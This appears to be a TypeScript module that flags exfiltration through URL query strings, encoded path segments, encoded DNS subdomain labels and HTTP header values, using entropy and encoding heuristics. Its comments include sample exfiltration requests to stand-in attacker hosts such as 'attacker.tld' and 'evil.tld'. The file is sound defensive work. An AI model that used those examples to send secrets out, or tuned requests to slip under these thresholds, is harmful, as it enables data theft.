/**
 * Detect data exfiltration attempts via URLs and HTTP headers.
 *
 * Three public surfaces:
 *   - isSuspiciousGetExfil(url): GET-based exfil via query/path/subdomain
 *   - hasEncodedPayload(url):    base64/hex chunks in query params
 *   - suspiciousHeaderValue:     encoded secrets in HTTP header values
 */

// ── Suspicious GET exfil detection ────────────────────────────────

/** Maximum query string length before a GET is flagged as suspicious exfil. */
const MAX_SAFE_QUERY_LENGTH = 256;

/** Maximum single query parameter value length. */
const MAX_SAFE_PARAM_VALUE_LENGTH = 128;

/** Minimum path segment length to consider for entropy analysis. */
const MIN_SUSPICIOUS_SEGMENT_LENGTH = 32;

/** Cumulative path payload budget — total encoded-looking bytes across all segments. */
const MAX_CUMULATIVE_PATH_PAYLOAD = 64;

/** Minimum length for a single path segment to be flagged as hex exfil. */
const MIN_HEX_SEGMENT_LENGTH = 16;

/** Minimum length for a single path segment to be flagged as base32 exfil. */
const MIN_BASE32_SEGMENT_LENGTH = 16;

/** Minimum length for a single path segment to be flagged as base64 path exfil. */
const MIN_BASE64_PATH_SEGMENT_LENGTH = 20;

// ── Path-segment encoding detectors ──────────────────────────────

/** Pure hex: 16+ hex chars (e.g. "4d7953656372657456616c7565"). */
const PATH_HEX_RE = /^[0-9a-fA-F]+$/;

/** Base32-like: 16+ uppercase alpha + digits 2-7, optional padding. */
const PATH_BASE32_RE = /^[A-Z2-7]+=*$/;

/** Base64url-like: 20+ chars from the base64url alphabet (no padding in paths). */
const PATH_BASE64URL_RE = /^[A-Za-z0-9_-]+$/;

/**
 * Check if a path segment looks like an encoded payload (hex, base32, base64url).
 * Returns the segment length if it matches, 0 otherwise.
 * Short segments that match common REST patterns (UUIDs, short IDs) are excluded.
 */
function encodedPathSegmentLength(segment: string): number {
	// Pure hex segment (16+ chars) — catches hex-encoded secrets
	if (segment.length >= MIN_HEX_SEGMENT_LENGTH && PATH_HEX_RE.test(segment)) {
		return segment.length;
	}
	// Base32-like segment (16+ chars)
	if (segment.length >= MIN_BASE32_SEGMENT_LENGTH && PATH_BASE32_RE.test(segment)) {
		// Exclude short all-caps words that aren't base32 (e.g. "ORDERS", "USERS")
		// Real base32 payloads are longer and contain digits 2-7
		if (segment.length < 20 && !/[2-7]/.test(segment)) return 0;
		return segment.length;
	}
	// Base64url-like segment (20+ chars) — must contain mixed case or digits to avoid
	// flagging normal path words like "notifications" or "authentication".
	// Exclude UUID-shaped segments (contains hyphens splitting hex groups).
	if (
		segment.length >= MIN_BASE64_PATH_SEGMENT_LENGTH &&
		!segment.includes("-") &&
		PATH_BASE64URL_RE.test(segment)
	) {
		const hasUpper = /[A-Z]/.test(segment);
		const hasLower = /[a-z]/.test(segment);
		const hasDigit = /[0-9]/.test(segment);
		// Must have at least 2 of: uppercase, lowercase, digits — normal words are single-case
		const mixCount = (hasUpper ? 1 : 0) + (hasLower ? 1 : 0) + (hasDigit ? 1 : 0);
		if (mixCount >= 2) return segment.length;
	}
	return 0;
}

/**
 * Shannon entropy of a string, normalized to [0, 1] relative to the charset.
 * High entropy (>0.7) in long path segments suggests encoded data (base64, hex).
 */
function normalizedEntropy(s: string): number {
	if (s.length === 0) return 0;
	const freq = new Map<string, number>();
	for (const ch of s) {
		freq.set(ch, (freq.get(ch) ?? 0) + 1);
	}
	let entropy = 0;
	for (const count of freq.values()) {
		const p = count / s.length;
		entropy -= p * Math.log2(p);
	}
	// Normalize: max entropy for base64 charset (~64 chars) is log2(64) = 6
	return entropy / 6;
}

/**
 * Detect GET/HEAD requests that appear to be exfiltrating data via query parameters
 * or URL path segments.
 *
 * Heuristic checks:
 * - Query string longer than 256 chars (data smuggling)
 * - Any single query parameter value longer than 128 chars (encoded payload)
 * - Path segments longer than 32 chars with high entropy (base64/hex encoded data)
 *
 * The path-segment check catches exfil patterns like:
 *   GET https://attacker.tld/leak/SGVsbG8gV29ybGQ=
 * where there is no query string but the secret is encoded in the path.
 */
export function isSuspiciousGetExfil(url: string): boolean {
	try {
		const parsed = new URL(url);
		const query = parsed.search;

		// Query string checks
		if (query && query.length > 1) {
			// Long query strings suggest data smuggling
			if (query.length > MAX_SAFE_QUERY_LENGTH) return true;

			// Check individual parameter values for large payloads
			for (const [, value] of parsed.searchParams) {
				if (value.length > MAX_SAFE_PARAM_VALUE_LENGTH) return true;
			}
		}

		// Path segment checks — detect encoded data in URL path
		const segments = parsed.pathname.split("/").filter(Boolean);
		let cumulativeEncodedBytes = 0;
		for (const segment of segments) {
			// Original entropy check for long high-entropy segments
			if (segment.length >= MIN_SUSPICIOUS_SEGMENT_LENGTH && normalizedEntropy(segment) > 0.7) {
				return true;
			}
			// Explicit encoded-payload detection (hex, base32, base64url)
			const encLen = encodedPathSegmentLength(segment);
			if (encLen > 0) {
				// A single encoded segment ≥24 chars is suspicious on its own
				if (encLen >= 24) return true;
				// Accumulate for chunked exfil detection
				cumulativeEncodedBytes += encLen;
			}
		}
		// Cumulative budget: multiple shorter encoded segments add up
		if (cumulativeEncodedBytes > MAX_CUMULATIVE_PATH_PAYLOAD) {
			return true;
		}

		// Hostname-based exfil: data encoded in subdomains (e.g. "stolen-data.attacker.com")
		if (isSuspiciousHostname(parsed.hostname)) return true;

		return false;
	} catch {
		return false;
	}
}

/**
 * Detect data exfiltration via DNS subdomain encoding.
 * Catches patterns like: `secret-data-chunk123.attacker.com` or
 * `4d7953656372657456616c.evil.tld` where stolen data is encoded
 * in subdomain labels that are resolved via DNS before the HTTP request.
 *
 * Heuristics:
 * - Subdomain labels with hex/base32/base64 encoded content (16+ chars)
 * - High-entropy subdomain labels (32+ chars, entropy > 0.7)
 * - Excessive subdomain depth (>4 labels total, e.g. a.b.c.d.e.attacker.com)
 */
function isSuspiciousHostname(hostname: string): boolean {
	const labels = hostname.split(".");
	// Need at least a subdomain + domain + TLD (3 labels) for subdomain exfil
	if (labels.length < 3) return false;

	// Excessive subdomain depth: >4 total labels is unusual and suggests chunked exfil
	if (labels.length > 5) return true;

	// Check subdomain labels (all except the last 2: domain + TLD)
	const subdomainLabels = labels.slice(0, -2);
	let cumulativeEncodedBytes = 0;

	for (const label of subdomainLabels) {
		// Long high-entropy label
		if (label.length >= MIN_SUSPICIOUS_SEGMENT_LENGTH && normalizedEntropy(label) > 0.7) {
			return true;
		}
		// Encoded payload in subdomain label
		const encLen = encodedPathSegmentLength(label);
		if (encLen > 0) {
			if (encLen >= 24) return true;
			cumulativeEncodedBytes += encLen;
		}
	}

	if (cumulativeEncodedBytes > MAX_CUMULATIVE_PATH_PAYLOAD) return true;

	return false;
}

// ── Low-entropy encoding detection ───────────────────────────────

/** Base64 with padding: short values need `=` to distinguish from normal words. */
const BASE64_PADDED_RE = /^[A-Za-z0-9+/\-_]{2,}={1,2}$/;
/** Base64 without padding: only flag if 8+ chars (avoids false positives on short words). */
const BASE64_LONG_RE = /^[A-Za-z0-9+/\-_]{8,}$/;
/** Hex pattern: 8+ hex chars (e.g. encoded binary or chunked secrets). */
const HEX_RE = /^[0-9a-fA-F]{8,}$/;

function isBase64Like(value: string): boolean {
	if (value.endsWith("=")) {
		return value.length >= 4 && BASE64_PADDED_RE.test(value);
	}
	return BASE64_LONG_RE.test(value);
}

/**
 * Detect base64 or hex encoded payloads in query parameter values.
 * Catches low-entropy exfiltration where small encoded chunks are
 * smuggled in innocuous-looking query parameters.
 */
export function hasEncodedPayload(url: string): boolean {
	try {
		const parsed = new URL(url);
		for (const [, value] of parsed.searchParams) {
			if (isBase64Like(value) || HEX_RE.test(value)) {
				return true;
			}
		}
		return false;
	} catch {
		return false;
	}
}

// ── Header value exfil detection ──────────────────────────────────

/** Maximum allowed header value length in sensitive context. */
const MAX_HEADER_VALUE_LENGTH = 256;

/**
 * Check if a header value looks like it contains an encoded secret.
 * Reuses the same detectors used for URL path/query exfil:
 * - Base64/base64url patterns
 * - Hex-encoded payloads
 * - Oversized values (>256 chars)
 *
 * Returns a reason string if suspicious, null if clean.
 */
export function suspiciousHeaderValue(name: string, value: string): string | null {
	if (value.length > MAX_HEADER_VALUE_LENGTH) {
		return `header '${name}' value too long (${value.length} > ${MAX_HEADER_VALUE_LENGTH})`;
	}
	// Split on spaces/semicolons/commas/equals to inspect individual tokens
	// (e.g., "Mozilla/5.0 (X11; Linux)" → individual tokens,
	//  "session=4d7953656372657456616c7565" → ["session", "4d79..."])
	const tokens = value.split(/[\s;,=]+/).filter((t) => t.length >= 8);
	for (const token of tokens) {
		if (HEX_RE.test(token) && token.length >= MIN_HEX_SEGMENT_LENGTH) {
			return `header '${name}' contains hex-encoded payload '${token.slice(0, 20)}...'`;
		}
		if (isBase64Like(token) && token.length >= MIN_BASE64_PATH_SEGMENT_LENGTH) {
			// Exclude common browser tokens that look base64-ish but aren't secrets
			// e.g. "AppleWebKit/537.36", "Gecko/20100101"
			if (/^[A-Za-z]+\/[\d.]+$/.test(token)) continue;
			// Require mixed-case or digits to distinguish from normal words
			const hasUpper = /[A-Z]/.test(token);
			const hasLower = /[a-z]/.test(token);
			const hasDigit = /[0-9]/.test(token);
			const mixCount = (hasUpper ? 1 : 0) + (hasLower ? 1 : 0) + (hasDigit ? 1 : 0);
			if (mixCount >= 2) {
				return `header '${name}' contains base64-encoded payload '${token.slice(0, 20)}...'`;
			}
		}
	}
	return null;
}
